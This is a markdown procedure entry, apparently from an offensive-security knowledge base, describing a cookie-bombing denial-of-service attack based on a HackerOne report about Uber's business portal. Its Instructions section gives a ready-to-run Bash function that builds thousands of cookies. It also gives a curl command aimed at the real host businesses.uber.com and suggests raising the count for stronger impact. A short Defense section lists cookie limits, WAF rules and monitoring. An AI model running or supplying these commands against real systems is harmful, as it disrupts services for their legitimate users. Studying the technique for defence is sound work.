---
tags:
  - dos
  - cookie-bombing
  - resource-exhaustion
type: procedure
tools: []
tactics:
  - '[[Impact]]'
commands:
  - '[[commands/curl-cookie-bomb]]'
techniques:
  - '[[Endpoint Denial of Service]]'
skill_level: novice
impact_level: low
detection_risk: high
sub_techniques: []
id: 871b61b7-5058-41c0-bebc-8a0a8b5bf736
created_at: '2025-12-14T17:26:48.170Z'
updated_at: '2025-12-14T17:26:48.170Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Impact]]'
mitre_techniques:
  - '[[Endpoint Denial of Service]]'
---
# Cookie-Bombing-DoS

## Summary

This procedure exploits a lack of limits on the number or size of cookies in HTTP requests to cause a Denial of Service (DoS) by forcing the server to consume excessive CPU and memory resources while parsing and processing thousands of cookies in a single request. It targets web applications like businesses.uber.com, where uncontrolled resource consumption leads to service disruption.

## Description

In this attack, the adversary crafts an HTTP request with an abnormally large number of cookies (e.g., thousands of key-value pairs) to overwhelm the server's cookie handling mechanisms. Servers typically allocate resources to parse, validate, and store cookies, and without safeguards like limits on cookie count or total size, this can exhaust memory or CPU, causing slowdowns or crashes. The vulnerability was reported on HackerOne for Uber's businesses portal, rated low severity due to its temporary and non-persistent impact. Prerequisites include basic network access; no authentication is needed for public endpoints. Expected outcomes include delayed responses or service unavailability for legitimate users during the attack.

## Requirements

1. Network access to the target web application (e.g., internet connectivity to businesses.uber.com)
2. Installed HTTP client like curl for sending custom requests
3. Basic scripting knowledge to generate large cookie strings (e.g., Bash loop)

## Defense

Defensive measures and detection strategies:

- Implement server-side limits on the maximum number of cookies per request (e.g., 50) and total header size (e.g., 8KB)
- Use web application firewalls (WAF) to inspect and block requests with anomalous cookie counts or sizes
- Enable rate limiting on endpoints to prevent repeated bombing attempts
- Monitor server logs for high CPU/memory usage correlated with large HTTP headers

## Objectives

1. Exhaust server resources through cookie parsing overload
2. Disrupt service availability for other users
3. Validate the presence of uncontrolled resource consumption vulnerabilities

## Instructions

### Step 1: Generate Excessive Cookie String

**Context**: Create a long string of cookie key-value pairs to simulate bombing. This step prepares the payload that will overload the server.

**Command** ([[commands/curl-cookie-bomb]]):
```bash
generate_cookies() {
  local count=$1
  local cookie=""
  for i in $(seq 1 $count); do
    cookie+="bombcookie$i=value$i; "
  done
  echo $cookie
}
COOKIE_STRING=$(generate_cookies 1000)
```

> This Bash function generates a cookie string with 1000 entries (adjust count for severity; e.g., 10,000 for stronger impact). Expected output: A long string like "bombcookie1=value1; bombcookie2=value2; ..." stored in COOKIE_STRING variable.

### Step 2: Send Cookie Bomb Request

**Context**: Transmit the crafted request to the target endpoint, forcing the server to process the excessive cookies and consume resources.

**Command** ([[commands/curl-cookie-bomb]]):
```bash
curl -H "Cookie: $COOKIE_STRING" https://businesses.uber.com/ -v --max-time 30
```

> This sends the request with the custom Cookie header using curl's verbose mode (-v) for debugging and a 30-second timeout (--max-time) to observe delays. Expected output: Slow or no response from the server, with verbose logs showing the large header being sent and potential timeouts indicating resource exhaustion.

## MITRE ATT&CK Mapping

### Tactics

- [[Impact]]

### Techniques

- [[Endpoint Denial of Service]]

### Sub-Techniques


## Commands Used

- [[commands/curl-cookie-bomb]]

## Tools Used


## Tags

- [[dos]]
- [[cookie-bombing]]
- [[resource-exhaustion]]
